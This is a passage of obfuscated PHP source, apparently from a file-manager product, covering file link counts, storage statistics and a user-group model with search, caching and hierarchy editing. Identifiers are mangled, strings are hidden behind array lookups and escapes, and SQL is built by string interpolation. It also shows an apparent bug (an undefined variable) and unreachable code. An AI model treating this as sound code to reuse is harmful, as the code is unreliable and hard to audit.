array($ÏÅ‰ä[2023] => intval($íÒã®[$ÏÅ‰ä[2030]]) + 1, $ÏÅ‰ä[617] => $Çú«³); $this->where(array($ÏÅ‰ä[542] => $íÒã®[$ÏÅ‰ä[541]]))->save($Ôèı•ê¾); return $íÒã®; } public function remove($×»ÁÊ×Ä) { $this->linkCountChange($×»ÁÊ×Ä, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ú„àßÂ) { $this->linkCountChange($Ú„àßÂ, !0); } public function linkCountChange($Å¼»¨®Ü, $Ê„Ğ°’) { $òâò“¸¦ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Å¼»¨®Ü) { return; } if (!is_array($Å¼»¨®Ü)) { $Å¼»¨®Ü = array($Å¼»¨®Ü); } $š‘Õ›²’ = array(); foreach ($Å¼»¨®Ü as $·ìÜ«û) { $‹¸ĞÃÁğ = $·ìÜ«û . $òâò“¸¦[12]; if (!$š‘Õ›²’[$‹¸ĞÃÁğ]) { $š‘Õ›²’[$‹¸ĞÃÁğ] = 0; } $š‘Õ›²’[$‹¸ĞÃÁğ]++; } $ÖôÜÖşÇ = array(); foreach ($š‘Õ›²’ as $·ìÜ«û => $¯çëúÄ) { $‹¸ĞÃÁğ = $¯çëúÄ . $òâò“¸¦[12]; if (!$ÖôÜÖşÇ[$‹¸ĞÃÁğ]) { $ÖôÜÖşÇ[$‹¸ĞÃÁğ] = array(); } $ÖôÜÖşÇ[$‹¸ĞÃÁğ][] = $·ìÜ«û; } foreach ($ÖôÜÖşÇ as $¯çëúÄ => $ƒÇÆ²¶ˆ) { if (!$ƒÇÆ²¶ˆ) { continue; } $¯çëúÄ = $Ê„Ğ°’ ? $¯çëúÄ : -intval($¯çëúÄ); $ëçéŞ‘ˆ = array($òâò“¸¦[541] => array($òâò“¸¦[7], $ƒÇÆ²¶ˆ)); if ($¯çëúÄ < 0) { $ëçéŞ‘ˆ[$òâò“¸¦[2030]] = array($òâò“¸¦[1086], abs($¯çëúÄ)); } $this->where($ëçéŞ‘ˆ)->setAdd($òâò“¸¦[2030], $¯çëúÄ); } } public function findByHash($Øº˜í, $÷õˆ˜´Î = false) { $Ï³›ñï÷ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Øº˜í && !$÷õˆ˜´Î) { return !1; } $™¯–•ÊĞ = array($Ï³›ñï÷[2024] => $Øº˜í); if ($÷õˆ˜´Î) { $™¯–•ÊĞ = array($Ï³›ñï÷[2025] => $÷õˆ˜´Î); } return $this->order($Ï³›ñï÷[2031])->where($™¯–•ÊĞ)->find(); } public function clearEmpty($Ç–áéİ¶ = 0) { $şŒ»ëšã =& $_SERVER[ˆ¡¹µ‹Â]; $ïòµ»ÔÜ = time() - 3600 * 24 * $Ç–áéİ¶; $ŠÍøÍš’ = $şŒ»ëšã[2032] . $ïòµ»ÔÜ; $ø‰Ë¼½ = $this->where($ŠÍøÍš’)->select(); if (!$ø‰Ë¼½) { return; } $ŒğÁËØı = new Task($şŒ»ëšã[2033], $şŒ»ëšã[12], count($ø‰Ë¼½)); foreach ($ø‰Ë¼½ as $ÚéÏÇê£) { $ŒğÁËØı->update(1); $this->resetFile($ÚéÏÇê£); } $ŒğÁËØı->end(); } public function resetFile($€Åİ‘“©) { $€€Ò¤û =& $_SERVER[ˆ¡¹µ‹Â]; $ƒÜˆ«ÀÊ = array($€€Ò¤û[542] => $€Åİ‘“©[$€€Ò¤û[541]]); $Ó†Ğ¾ß = Model($€€Ò¤û[1411])->where($ƒÜˆ«ÀÊ)->count(); $øÌëÎµÍ = Model($€€Ò¤û[2034])->where($ƒÜˆ«ÀÊ)->count(); $åˆÒ¤†Ã = intval($Ó†Ğ¾ß) + intval($øÌëÎµÍ); if ($åˆÒ¤†Ã == 0) { IO::remove($€Åİ‘“©[$€€Ò¤û[87]]); Model($€€Ò¤û[2035])->delete($€Åİ‘“©[$€€Ò¤û[541]]); $this->where($ƒÜˆ«ÀÊ)->delete(); $this->metaSet($€Åİ‘“©[$€€Ò¤û[541]], null, null); write_log(ACTION . $€€Ò¤û[2036] . KodUser::id() . $€€Ò¤û[2037] . $€Åİ‘“©[$€€Ò¤û[541]] . $€€Ò¤û[2038] . $€Åİ‘“©[$€€Ò¤û[79]] . $€€Ò¤û[201] . $€Åİ‘“©[$€€Ò¤û[87]], $€€Ò¤û[2039]); return; } if ($€Åİ‘“©[$€€Ò¤û[2030]] != $åˆÒ¤†Ã) { $this->where($ƒÜˆ«ÀÊ)->save(array($€€Ò¤û[2023] => $åˆÒ¤†Ã)); } } public function storageInfo($‰ÉêÕ—ô = false) { $©®¨àÑ‚ =& $_SERVER[ˆ¡¹µ‹Â]; $šÊëÍê = $this->count() + 0.0; $â€©Ş•¬ = 0; $´ßÌˆŠ× = 1; $ö…“³»¤ = 0; $âöĞÒéü = 5000; for ($·ÒË¯Åˆ = 0; $·ÒË¯Åˆ < $šÊëÍê; $·ÒË¯Åˆ = $·ÒË¯Åˆ + $âöĞÒéü) { $“èüÀ¤ = $this->limit($·ÒË¯Åˆ, $·ÒË¯Åˆ + $âöĞÒéü)->select(); foreach ($“èüÀ¤ as $éî±á) { $´ßÌˆŠ× += $éî±á[$©®¨àÑ‚[79]] * $éî±á[$©®¨àÑ‚[2030]]; $â€©Ş•¬ += $éî±á[$©®¨àÑ‚[79]] * ($éî±á[$©®¨àÑ‚[2030]] - 1); $ö…“³»¤ += $éî±á[$©®¨àÑ‚[2030]]; } } $í²şÉ¢¼ = array($©®¨àÑ‚[2040] => $´ßÌˆŠ×, $©®¨àÑ‚[2041] => $â€©Ş•¬, $©®¨àÑ‚[2042] => $â€©Ş•¬ / $´ßÌˆŠ×, $©®¨àÑ‚[83] => $šÊëÍê, $©®¨àÑ‚[2043] => $ö…“³»¤); return $í²şÉ¢¼; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\x70"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\141\x6d\145" => "\x67\162\157\165\x70\137\155\x65\x74\141", "\155\145\x74\141\106\151\x65\x6c\144" => "\147\x72\157\x75\160\x49\x44"); protected function cacheFunctionAlias($ï•¾Î©) { $”ãİÇ˜® =& $_SERVER[ˆ¡¹µ‹Â]; return array($”ãİÇ˜®[2044] => array($ï•¾Î©[0], $”ãİÇ˜®[2045]), $”ãİÇ˜®[2046] => array($ï•¾Î©[0], $”ãİÇ˜®[2047])); } protected function getInfo($½Ø˜À, $¢¬¤«Õò = false) { $å¯Çµß½ = $this->getInfoSimple($½Ø˜À); if (!$å¯Çµß½) { return !1; } if ($¢¬¤«Õò) { return $this->_listDataApplyItem($å¯Çµß½); } return $this->cacheFunctionGet($_SERVER[ˆ¡¹µ‹Â][2048], $½Ø˜À); } protected function getInfoSimple($ÏˆüÒæ£, $Ú¼Äğº = false) { $Œ¬¿ã›İ =& $_SERVER[ˆ¡¹µ‹Â]; if ($Ú¼Äğº) { $ú·ï«±Ï = array($Œ¬¿ã›İ[1962] => intval($ÏˆüÒæ£)); $‡¢éÀ = $this->where($ú·ï«±Ï)->find(); return is_array($‡¢éÀ) ? $‡¢éÀ : array(); } return $this->cacheFunctionGet($Œ¬¿ã›İ[2049], $ÏˆüÒæ£); } protected function groupAdd($İªüÈÉÉ) { $ÇÜˆ€õı =& $_SERVER[ˆ¡¹µ‹Â]; if (!$İªüÈÉÉ[$ÇÜˆ€õı[192]] && isset($İªüÈÉÉ[$ÇÜˆ€õı[1962]]) && $İªüÈÉÉ[$ÇÜˆ€õı[1962]] == 1) { if ($Î‘ÚÖ¼­ = $this->getInfoSimple($İªüÈÉÉ[$ÇÜˆ€õı[1962]], !0)) { return $İªüÈÉÉ[$ÇÜˆ€õı[1962]]; } } else { $Î‘ÚÖ¼­ = $this->getInfoSimple($İªüÈÉÉ[$ÇÜˆ€õı[192]]); if (!$Î‘ÚÖ¼­) { return !1; } } $˜á“§ã = $ÇÜˆ€õı[594]; if ($Î‘ÚÖ¼­[$ÇÜˆ€õı[584]]) { $˜á“§ã = $Î‘ÚÖ¼­[$ÇÜˆ€õı[584]] . $Î‘ÚÖ¼­[$ÇÜˆ€õı[1962]] . $ÇÜˆ€õı[50]; } $°©´èã• = array($ÇÜˆ€õı[494] => $this->groupNameAuto($İªüÈÉÉ[$ÇÜˆ€õı[192]], $İªüÈÉÉ[$ÇÜˆ€õı[32]]), $ÇÜˆ€õı[477] => $İªüÈÉÉ[$ÇÜˆ€õı[192]], $ÇÜˆ€õı[652] => $˜á“§ã, $ÇÜˆ€õı[2050] => $İªüÈÉÉ[$ÇÜˆ€õı[1948]], $ÇÜˆ€õı[2051] => 0, $ÇÜˆ€õı[1966] => 0); if (isset($İªüÈÉÉ[$ÇÜˆ€õı[1986]])) { $°©´èã•[$ÇÜˆ€õı[1986]] = $İªüÈÉÉ[$ÇÜˆ€õı[1986]]; } else { $Âê˜ç£Ç = $this->max($ÇÜˆ€õı[1986]); if (!$Âê˜ç£Ç) { $Âê˜ç£Ç = 0; } $°©´èã•[$ÇÜˆ€õı[1986]] = $Âê˜ç£Ç + 1; } if (!empty($İªüÈÉÉ[$ÇÜˆ€õı[1962]])) { $°©´èã•[$ÇÜˆ€õı[1962]] = $İªüÈÉÉ[$ÇÜˆ€õı[1962]]; } $­çˆë¡š = $this->add($°©´èã•); $this->setNamePinyin($­çˆë¡š, $°©´èã•[$ÇÜˆ€õı[32]]); if (isset($İªüÈÉÉ[$ÇÜˆ€õı[2052]])) { $this->metaSet($­çˆë¡š, array($ÇÜˆ€õı[2052] => $İªüÈÉÉ[$ÇÜˆ€õı[2052]], $ÇÜˆ€õı[2053] => $İªüÈÉÉ[$ÇÜˆ€õı[2053]])); unset($İªüÈÉÉ[$ÇÜˆ€õı[2052]]); unset($İªüÈÉÉ[$ÇÜˆ€õı[2053]]); } Model($ÇÜˆ€õı[1411])->groupRootAdd($­çˆë¡š); $this->_clearCache($İªüÈÉÉ[$ÇÜˆ€õı[192]]); return $­çˆë¡š; } protected function groupEdit($—©À‰¸¥, $¹İ»“¸) { $ÛÜ¥Ôù— =& $_SERVER[ˆ¡¹µ‹Â]; $¸¬©Õñ = $this->getInfoSimple($—©À‰¸¥); if (!$¸¬©Õñ) { return !1; } if (!empty($¹İ»“¸[$ÛÜ¥Ôù—[192]])) { $ıÄ”® = $this->getInfoSimple($¹İ»“¸[$ÛÜ¥Ôù—[192]]); if (!$ıÄ”®) { return !1; } if ($¸¬©Õñ[$ÛÜ¥Ôù—[1962]] == $ıÄ”®[$ÛÜ¥Ôù—[1962]]) { return !1; } if ($¹İ»“¸[$ÛÜ¥Ôù—[192]] != $¸¬©Õñ[$ÛÜ¥Ôù—[192]]) { if ($ıÄ”®[$ÛÜ¥Ôù—[584]] !== $¸¬©Õñ[$ÛÜ¥Ôù—[584]] && strpos($ıÄ”®[$ÛÜ¥Ôù—[584]], $¸¬©Õñ[$ÛÜ¥Ôù—[584]] . $¸¬©Õñ[$ÛÜ¥Ôù—[1962]] . $ÛÜ¥Ôù—[50]) === 0) { return !1; } $¹İ»“¸[$ÛÜ¥Ôù—[652]] = $ıÄ”®[$ÛÜ¥Ôù—[584]] . $¹İ»“¸[$ÛÜ¥Ôù—[192]] . $ÛÜ¥Ôù—[50]; $this->_changeChildLevel($¸¬©Õñ, $ıÄ”®); $this->_clearCache($ıÄ”®[$ÛÜ¥Ôù—[1962]]); $this->_clearCache($¸¬©Õñ[$ÛÜ¥Ôù—[192]]); } } if (isset($¹İ»“¸[$ÛÜ¥Ôù—[32]])) { $this->setNamePinyin($—©À‰¸¥, $¹İ»“¸[$ÛÜ¥Ôù—[32]]); } if (isset($¹İ»“¸[$ÛÜ¥Ôù—[2052]])) { $this->metaSet($—©À‰¸¥, array($ÛÜ¥Ôù—[2052] => $¹İ»“¸[$ÛÜ¥Ôù—[2052]], $ÛÜ¥Ôù—[2053] => $¹İ»“¸[$ÛÜ¥Ôù—[2053]])); unset($¹İ»“¸[$ÛÜ¥Ôù—[2052]]); unset($¹İ»“¸[$ÛÜ¥Ôù—[2053]]); } $this->_clearChildrenCache($¸¬©Õñ); return $this->where(array($ÛÜ¥Ôù—[2054] => $—©À‰¸¥))->save($¹İ»“¸); } private function _clearChildrenCache($üğ¹…£) { $‹ã™™öş =& $_SERVER[ˆ¡¹µ‹Â]; $ğËà×»š = array($‹ã™™öş[652] => array($‹ã™™öş[612], $üğ¹…£[$‹ã™™öş[584]] . $üğ¹…£[$‹ã™™öş[1962]] . $‹ã™™öş[613])); $Ù”©–š’ = $this->field($‹ã™™öş[1962])->where($ğËà×»š)->select(); foreach ($Ù”©–š’ as $©êŞ‰ÒÇ) { $this->_clearCache($©êŞ‰ÒÇ[$‹ã™™öş[1962]]); } } private function _clearCache($šüÇÚöï) { $ÇïçìŞğ =& $_SERVER[ˆ¡¹µ‹Â]; $this->cacheFunctionClear($ÇïçìŞğ[2048], $šüÇÚöï); $this->cacheFunctionClear($ÇïçìŞğ[2049], $šüÇÚöï); } private function _changeChildLevel($ºáÛğ’š, $ †¨Äéã, $¶« Ã¼ = false) { $ğœıµ·³ =& $_SERVER[ˆ¡¹µ‹Â]; $­œÆõãş = $ºáÛğ’š[$ğœıµ·³[584]] . $ºáÛğ’š[$ğœıµ·³[1962]] . $ğœıµ·³[50]; $…ù§ù»É = $ †¨Äéã[$ğœıµ·³[584]] . $ †¨Äéã[$ğœıµ·³[1962]] . $ğœıµ·³[50] . $ºáÛğ’š[$ğœıµ·³[1962]] . $ğœıµ·³[50]; if ($¶« Ã¼) { $…ù§ù»É = $ †¨Äéã[$ğœıµ·³[584]] . $ †¨Äéã[$ğœıµ·³[1962]] . $ğœıµ·³[50]; } $¡Ì²®–á = array($ğœıµ·³[652] => array($ğœıµ·³[612], $ºáÛğ’š[$ğœıµ·³[584]] . $ºáÛğ’š[$ğœıµ·³[1962]] . $ğœıµ·³[613])); $”‡¤”¬´ = array($ğœıµ·³[652] => array($ğœıµ·³[661], "\162\145\x70\154\x61\143\x65\50\x70\141\162\x65\156\x74\114\x65\166\x65\154\54\x27{$­œÆõãş}\x27\54\47{$…ù§ù»É}\47\x29")); $this->_clearChildrenCache($ºáÛğ’š); $this->where($¡Ì²®–á)->data($”‡¤”¬´)->save(); } public function setNamePinyin($¿ÛÎªŞ„, $úè„¦½ş = false) { $ï â˜‘Ê =& $_SERVER[ˆ¡¹µ‹Â]; if (!$úè„¦½ş) { $Æ¤× – = $this->getInfoSimple($¿ÛÎªŞ„); $úè„¦½ş = $Æ¤× –[$ï â˜‘Ê[32]]; } if (!Input::check($úè„¦½ş, $ï â˜‘Ê[655])) { $this->metaSet($¿ÛÎªŞ„, $ï â˜‘Ê[538], null); $this->metaSet($¿ÛÎªŞ„, $ï â˜‘Ê[537], null); return; } $ùŠ˜¦òó = array($ï â˜‘Ê[538] => str_replace($ï â˜‘Ê[53], $ï â˜‘Ê[12], Pinyin::get($úè„¦½ş)), $ï â˜‘Ê[537] => Pinyin::get($úè„¦½ş, $ï â˜‘Ê[656])); $this->metaSet($¿ÛÎªŞ„, $ùŠ˜¦òó); } protected function metaSet($Ö²´Àí, $’™Š‘† = null, $„á”ÁŸ = null) { $this->_clearCache($Ö²´Àí); return parent::metaSet($Ö²´Àí, $’™Š‘†, $„á”ÁŸ); } protected function groupStatus($âµ‘ÍŠñ, $¥äø¾İ†) { $œŞ…°Ö® =& $_SERVER[ˆ¡¹µ‹Â]; $ÓÚ‡İÏÂ = $this->getInfoSimple($âµ‘ÍŠñ); if (!$ÓÚ‡İÏÂ) { return !1; } $this->_clearCache($âµ‘ÍŠñ); return $this->metaSet($âµ‘ÍŠñ, $œŞ…°Ö®[817], $¥äø¾İ†); if ($¥äø¾İ† == $œŞ…°Ö®[91]) { $¶ÓòÕÏ» = $this->parentLevelArray($ÓÚ‡İÏÂ[$œŞ…°Ö®[584]]); } else { } $¶ÓòÕÏ»[] = $ÓÚ‡İÏÂ[$œŞ…°Ö®[1962]]; $£Ïêœ—‹ = array(); foreach ($¶ÓòÕÏ» as $âµ‘ÍŠñ) { $£Ïêœ—‹[] = array($œŞ…°Ö®[1962] => $âµ‘ÍŠñ, $œŞ…°Ö®[97] => $œŞ…°Ö®[817], $œŞ…°Ö®[450] => $¥äø¾İ†); $this->_clearCache($âµ‘ÍŠñ); } return Model($œŞ…°Ö®[2055])->addAll($£Ïêœ—‹, array(), !0); } protected function groupRemove($Úá·¶¾, $ùûÆ‚ÂÈ = false) { $ıÌ¡ƒ† =& $_SERVER[ˆ¡¹µ‹Â]; $Á¤åö§Š = array($ıÌ¡ƒ†[1962] => $Úá·¶¾); $¸ØÔ­¾œ = $this->where($Á¤åö§Š)->find(); if (!$¸ØÔ­¾œ || $¸ØÔ­¾œ[$ıÌ¡ƒ†[192]] == 0) { return !1; } if (!$ùûÆ‚ÂÈ) { $ñ÷² = $this->getInfoSimple($¸ØÔ­¾œ[$ıÌ¡ƒ†[192]]); $this->_changeChildLevel($¸ØÔ­¾œ, $ñ÷², !0); $this->where(array($ıÌ¡ƒ†[192] => $Úá·¶¾))->save(array($ıÌ¡ƒ†[192] => $¸ØÔ­¾œ[$ıÌ¡ƒ†[192]])); $this->_clearCache($ñ÷²[$ıÌ¡ƒ†[1962]]); } Model($ıÌ¡ƒ†[2055])->where($Á¤åö§Š)->delete(); Model($ıÌ¡ƒ†[2056])->where($Á¤åö§Š)->delete(); Model($ıÌ¡ƒ†[899])->groupRootRemove($Úá·¶¾); $this->_clearCache($¸ØÔ­¾œ[$ıÌ¡ƒ†[192]]); return $this->where($Á¤åö§Š)->delete(); } protected function groupSort($Ú‹¿ûı…) { $ÀØú…¹ä =& $_SERVER[ˆ¡¹µ‹Â]; $ÜÎÅ °™ = array(); foreach ($Ú‹¿ûı… as $…™†Şşæ => $³ó¬ºÂ ) { $ÜÎÅ °™[] = array($ÀØú…¹ä[1962], $³ó¬ºÂ , $ÀØú…¹ä[1986], $…™†Şşæ + 1); } $this->saveAll($ÜÎÅ °™); } public function listData() { $ÍÁ±ÇÈ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÍÁ±ÇÈ[$_SERVER[ˆ¡¹µ‹Â][445]]); return $ÍÁ±ÇÈ; } private function _makeOrder($òû—Ëã = '') { $èí²äŸ¸ =& $_SERVER[ˆ¡¹µ‹Â]; $ùÉèê¤× = array($èí²äŸ¸[1962], $èí²äŸ¸[32], $èí²äŸ¸[1950], $èí²äŸ¸[231]); $”¨Ş¶÷ = array($èí²äŸ¸[523] => $èí²äŸ¸[524], $èí²äŸ¸[525] => $èí²äŸ¸[526]); $Ò¡‡Ñùº = Input::get($èí²äŸ¸[530], $èí²äŸ¸[7], $èí²äŸ¸[1966], $ùÉèê¤×); $ãŞá¶…¿ = Input::get($èí²äŸ¸[531], $èí²äŸ¸[7], $èí²äŸ¸[2057], array($èí²äŸ¸[2057], $èí²äŸ¸[525])); $ãŞá¶…¿ = $”¨Ş¶÷[$ãŞá¶…¿]; $òû—Ëã = $òû—Ëã . "{$Ò¡‡Ñùº}\40{$ãŞá¶…¿}\x2c\40\147\162\x6f\165\160\x49\x44\x20\x61\163\x63"; return $this->order($òû—Ëã); } public function listChild($ê¹‡É¢Ø) { $ËŒÚ­ÕÉ =& $_SERVER[ˆ¡¹µ‹Â]; $Ëíó—êÛ = $this->where(array($ËŒÚ­ÕÉ[192] => $ê¹‡É¢Ø))->_makeOrder()->selectPage(200); $this->_listDataApply($Ëíó—êÛ[$ËŒÚ­ÕÉ[445]]); return $Ëíó—êÛ; } public function listChildIds($¹¸¡½ğ‘) { $ÅÔ€ÑÈ =& $_SERVER[ˆ¡¹µ‹Â]; if (is_string($ÇÉ¥÷­±)) { $¹¸¡½ğ‘ = explode($ÅÔ€ÑÈ[50], $¹¸¡½ğ‘); } $Ú§§¾Â· = $this->where(array($ÅÔ€ÑÈ[1962] => array($ÅÔ€ÑÈ[7], $¹¸¡½ğ‘)))->field($ÅÔ€ÑÈ[2058])->select(); if (!$Ú§§¾Â·) { return !1; } $ˆ©Û‡• = array(); foreach ($Ú§§¾Â· as $”›¡Ü—¨) { $ˆ©Û‡•[] = "\x73\145\x6c\145\143\164\40\147\x72\157\165\x70\x49\x44\x20\x66\162\157\x6d\40\140\x67\x72\157\165\160\140\x20\167\150\145\162\145\40\160\141\x72\x65\x6e\x74\114\x65\166\145\x6c\x20\x6c\x69\153\x65\x20\x27{$”›¡Ü—¨[$ÅÔ€ÑÈ[584]]}{$”›¡Ü—¨[$ÅÔ€ÑÈ[1962]]}\54\45\47"; } $ˆ©Û‡• = implode($ÅÔ€ÑÈ[2059], $ˆ©Û‡•); $Ú§§¾Â· = $this->query($ˆ©Û‡•); if (!$Ú§§¾Â·) { return array(); } $¹¸¡½ğ‘ = array_to_keyvalue($Ú§§¾Â·, $ÅÔ€ÑÈ[12], $ÅÔ€ÑÈ[1962]); return array_unique($¹¸¡½ğ‘); } public function listByID($˜î‡ÜÂÛ) { $·æáû„£ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$˜î‡ÜÂÛ) { return array(); } $™ æÆªğ = array($·æáû„£[1962] => array($·æáû„£[7], $˜î‡ÜÂÛ)); $½ÑÎ«·¹ = $this->where($™ æÆªğ)->select(); $½ÑÎ«·¹ = array_sort_keep($½ÑÎ«·¹, $·æáû„£[1962], $˜î‡ÜÂÛ); $this->_listDataApply($½ÑÎ«·¹); return $½ÑÎ«·¹; } public function listSearch($Û†ŠıÛ™) { $õª©êš =& $_SERVER[ˆ¡¹µ‹Â]; $ôšíÁâ = trim($Û†ŠıÛ™[$õª©êš[2060]]); $’½‚ÉÚ÷ = explode($õª©êš[53], $ôšíÁâ); if (!$ôšíÁâ || count($’½‚ÉÚ÷) == 1) { return $this->listSearchNow($Û†ŠıÛ™); } $„è™ËˆÎ = array($õª©êš[445] => array()); foreach ($’½‚ÉÚ÷ as $ÑÄÇ·ÖÍ) { if (!trim($ÑÄÇ·ÖÍ)) { continue; } $Û†ŠıÛ™[$õª©êš[2060]] = $ÑÄÇ·ÖÍ; $°Ì¡Õ¶Ä = $this->listSearchNow($Û†ŠıÛ™); $„è™ËˆÎ[$õª©êš[445]] = array_merge($„è™ËˆÎ[$õª©êš[445]], $°Ì¡Õ¶Ä[$õª©êš[445]]); } $„è™ËˆÎ[$õª©êš[445]] = array_unique_by_key($„è™ËˆÎ[$õª©êš[445]], $õª©êš[1962]); $„è™ËˆÎ[$õª©êš[442]] = array($õª©êš[443] => count($„è™ËˆÎ[$õª©êš[445]]), $õª©êš[439] => 20, $õª©êš[429] => 1, $õª©êš[444] => 1); return $„è™ËˆÎ; } public function listSearchNow($Éª¼‘ß†) { $ËüÊ²ìÔ =& $_SERVER[ˆ¡¹µ‹Â]; $åÃŒ¥Ÿ = trim($Éª¼‘ß†[$ËüÊ²ìÔ[2060]]); $ÍË¥æÏÂ = isset($Éª¼‘ß†[$ËüÊ²ìÔ[2061]]) ? $Éª¼‘ß†[$ËüÊ²ìÔ[2061]] : !1; if (!trim($åÃŒ¥Ÿ)) { return !1; } $åÃŒ¥Ÿ = str_replace($ËüÊ²ìÔ[2062], $ËüÊ²ìÔ[2063], $åÃŒ¥Ÿ); $‡™µê¹„ = array($ËüÊ²ìÔ[1962] => array($ËüÊ²ìÔ[459], "{$åÃŒ¥Ÿ}\x25"), $ËüÊ²ìÔ[32] => array($ËüÊ²ìÔ[459], "\45{$åÃŒ¥Ÿ}\45"), $ËüÊ²ìÔ[1071] => $ËüÊ²ìÔ[2064]); if ($ÍË¥æÏÂ) { $´¹Ñ‹ Ş = $this->getInfoSimple($ÍË¥æÏÂ); $¤û¶¥ğ¡ = $´¹Ñ‹ Ş[$ËüÊ²ìÔ[584]] . $ÍË¥æÏÂ . $ËüÊ²ìÔ[613]; $‡™µê¹„ = array($‡™µê¹„, array($ËüÊ²ìÔ[584] => array($ËüÊ²ìÔ[459], $¤û¶¥ğ¡))); } $‡™µê¹„ = $this->parseWhereLike($‡™µê¹„); $‡£¿‡§ = $this->_makeOrder()->where($‡™µê¹„)->selectPage(20); $‡£¿‡§ = $‡£¿‡§ ? $‡£¿‡§ : array($ËüÊ²ìÔ[445] => array(), $ËüÊ²ìÔ[442] => array()); if (!$‡£¿‡§ || count($‡£¿‡§[$ËüÊ²ìÔ[445]]) < 5 && Input::check($åÃŒ¥Ÿ, $ËüÊ²ìÔ[394])) { $Ë–äàõÍ = $this->groupChildrenAll($ÍË¥æÏÂ); $¶ÔáÂ‰¸ = $this->_searchFromMeta($ËüÊ²ìÔ[537], $åÃŒ¥Ÿ, 10, $Ë–äàõÍ); $»ÕŠ¦êÕ = $this->_searchFromMeta($ËüÊ²ìÔ[538], $åÃŒ¥Ÿ, 10, $Ë–äàõÍ); $¡ñ¤¥¸ç = array_merge($¶ÔáÂ‰¸, $»ÕŠ¦êÕ, $‡£¿‡§[$ËüÊ²ìÔ[445]]); $‡£¿‡§[$ËüÊ²ìÔ[445]] = array_unique_by_key($¡ñ¤¥¸ç, $ËüÊ²ìÔ[1962]); $‡£¿‡§[$ËüÊ²ìÔ[442]][$ËüÊ²ìÔ[443]] = count($‡£¿‡§[$ËüÊ²ìÔ[445]]); $‡£¿‡§[$ËüÊ²ìÔ[442]][$ËüÊ²ìÔ[444]] = ceil($‡£¿‡§[$ËüÊ²ìÔ[442]][$ËüÊ²ìÔ[443]] / $‡£¿‡§[$ËüÊ²ìÔ[442]][$ËüÊ²ìÔ[439]]); } $this->_listDataApply($‡£¿‡§[$ËüÊ²ìÔ[445]]); return $‡£¿‡§; } protected function groupChildrenAll($¨Ê¹™ùğ) { $÷Á­óƒ„ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$¨Ê¹™ùğ) { return !1; } if (!is_array($¨Ê¹™ùğ)) { $¨Ê¹™ùğ = array($¨Ê¹™ùğ); } $í¬ñ´ÏĞ = $¨Ê¹™ùğ; foreach ($¨Ê¹™ùğ as $å”ó™µê) { $Ê¾‡æµ‚ = $this->getInfoSimple($å”ó™µê); $ĞïÔöêÖ = array($÷Á­óƒ„[584] => array($÷Á­óƒ„[459], $Ê¾‡æµ‚[$÷Á­óƒ„[584]] . $å”ó™µê . $÷Á­óƒ„[613])); $ãÔÄÅİ = $this->field($÷Á­óƒ„[1962])->where($ĞïÔöêÖ)->select(); $í¬ñ´ÏĞ = array_merge($í¬ñ´ÏĞ, array_to_keyvalue($ãÔÄÅİ, $÷Á­óƒ„[12], $÷Á­óƒ„[1962])); } return array_unique($í¬ñ´ÏĞ); } private function _searchFromMeta($İÄæÎ±, $›ê¦²®, $˜Ö¥¼, $÷‘¼”Šó) { $×„‘ËÎ =& $_SERVER[ˆ¡¹µ‹Â]; $›ê¦²® = strtolower($›ê¦²®); $¥¿Â›¼ƒ = array($×„‘ËÎ[97] => $İÄæÎ±, $×„‘ËÎ[450] => array($×„‘ËÎ[459], "\45{$›ê¦²®}\45")); $¥¿Â›¼ƒ = $this->parseWhereLike($¥¿Â›¼ƒ); if ($÷‘¼”Šó) { $¥¿Â›¼ƒ[$×„‘ËÎ[1962]] = array($×„‘ËÎ[7], $÷‘¼”Šó); } $‚şµ•¢› = Model($×„‘ËÎ[2065])->where($¥¿Â›¼ƒ)->limit($˜Ö¥¼)->select(); if (!$‚şµ•¢›) { return array(); } $‚şµ•¢› = array_to_keyvalue($‚şµ•¢›, $×„‘ËÎ[12], $×„‘ËÎ[1962]); $æÇÖ›€‘ = $this->where(array($×„‘ËÎ[2054] => array($×„‘ËÎ[7], $‚şµ•¢›)))->select(); if (!$æÇÖ›€‘) { return array(); } return $æÇÖ›€‘; } protected function _listDataApplyItem($…Ÿæƒªã) { $ùÇ¦¯¡¤ = array($…Ÿæƒªã); $this->_listDataApply($ùÇ¦¯¡¤); return $ùÇ¦¯¡¤[0]; } protected function _listDataApply(&$öÊÏ„˜·) { $ËÜÇÙìö =& $_SERVER[ˆ¡¹µ‹Â]; if (!$öÊÏ„˜·) { return; } $û˜ªËÆœ = array_to_keyvalue($öÊÏ„˜·, $ËÜÇÙìö[12], $ËÜÇÙìö[1962]); $this->_listAppendChildren($öÊÏ„˜·); $this->_listAppendChildrenMember($öÊÏ„˜·); $this->_listAppendMeta($öÊÏ„˜·, $û˜ªËÆœ); $this->_listAppendParent($öÊÏ„˜·); $this->_listAppendSourceRoot($öÊÏ„˜·, $û˜ªËÆœ); } private function _listAppendChildren(&$Éë€ŒºŒ) { $¾ˆııÛÃ =& $_SERVER[ˆ¡¹µ‹Â]; $Ëõ¾Ä§ = array_to_keyvalue($Éë€ŒºŒ, $¾ˆııÛÃ[12], $¾ˆııÛÃ[1962]); $€ˆ²ëŸÙ = array($¾ˆııÛÃ[192] => array($¾ˆııÛÃ[7], $Ëõ¾Ä§)); $û”›îì… = array($¾ˆııÛÃ[192], $¾ˆııÛÃ[2066] => $¾ˆııÛÃ[565]); $Œœ®¸¢É = $this->field($û”›îì…)->where($€ˆ²ëŸÙ)->group($¾ˆııÛÃ[192])->select(); $¸›¥şÍ¸ = array_to_keyvalue($Œœ®¸¢É, $¾ˆııÛÃ[192], $¾ˆııÛÃ[565]); foreach ($Éë€ŒºŒ as &$Ô¿£şÇé) { $ì­½òë— = $Ô¿£şÇé[$¾ˆııÛÃ[1962]]; $Ô¿£şÇé[$¾ˆııÛÃ[2067]] = isset($¸›¥şÍ¸[$ì­½òë—]) ? intval($¸›¥şÍ¸[$ì­½òë—]) : !1; } unset($Ô¿£şÇé); } private function _listAppendChildrenMember(&$éµ‘Æ¸º) { $Êß™ô‚ø =& $_SERVER[ˆ¡¹µ‹Â]; $ê‡ÍŠÌ = array_to_keyvalue($éµ‘Æ¸º, $Êß™ô‚ø[12], $Êß™ô‚ø[1962]); $øÕÙ¸â³ = array($Êß™ô‚ø[1962] => 